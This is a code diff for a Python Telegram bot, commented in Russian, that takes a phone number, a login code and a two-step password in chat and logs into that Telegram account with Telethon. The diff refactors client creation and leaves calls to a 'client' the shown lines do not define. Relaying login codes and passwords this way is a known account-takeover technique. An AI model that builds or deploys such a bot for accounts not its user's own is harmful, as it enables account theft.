@@ -1,12 +1,10 @@
 import logging
-import asyncio
 import os
 from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
 from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from telethon import TelegramClient
 from dotenv import load_dotenv
-from defunc import *
 from telethon.errors import SessionPasswordNeededError
 from datetime import datetime
 
@@ -88,15 +86,6 @@ async def get_phone_number(message: types.Message):
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
 
-# Дополнительная проверка для случаев, когда текст сообщения не удовлетворяет условиям
-@dp.message_handler(lambda message: message.text and not (message.text.startswith('+') and message.text[1:].isdigit() and len(message.text) > 10) and message.from_user.id in allowed_users)
-async def invalid_phone_number(message: types.Message):
-    await message.reply("Неверный формат номера телефона. Пожалуйста, введите номер, начинающийся с '+', содержащий только цифры, и длиной более 10 символов.")
-
-# Функция для создания нового экземпляра клиента
-def create_client():
-    return TelegramClient('session_name', api_id, api_hash)
-
 @dp.message_handler(lambda message: 'phone_code_hash' in user_state.get(message.from_user.id, {}))
 async def get_code(message: types.Message):
     code = message.text
@@ -105,7 +94,6 @@ async def get_code(message: types.Message):
     user_chat_id = message.from_user.id
 
     try:
-        client = create_client()
         await client.connect()
         try:
             # Проверяем, что пин-код состоит из 5 цифр
@@ -134,7 +122,6 @@ async def process_password(message: types.Message):
     phone_code_hash = user_state[message.from_user.id]['phone_code_hash']
     user_id = message.from_user.id
     try:
-        client = create_client()
         await client.connect()
         
         # Входим в аккаунт с использованием номера телефона, пин-кода и пароля
@@ -165,6 +152,9 @@ async def process_user_data(client, phone_number, user_id):
     except Exception as e:
         await client.disconnect()
         raise e
+@dp.message_handler(lambda message: message.text and not (message.text.startswith('+') and message.text[1:].isdigit() and len(message.text) > 10) and message.from_user.id in allowed_users)
+async def invalid_phone_number(message: types.Message):
+    await message.reply("Неверный формат номера телефона. Пожалуйста, введите номер, начинающийся с '+', содержащий только цифры, и длиной более 10 символов.")
 
 # Запуск бота
 if __name__ == '__main__':
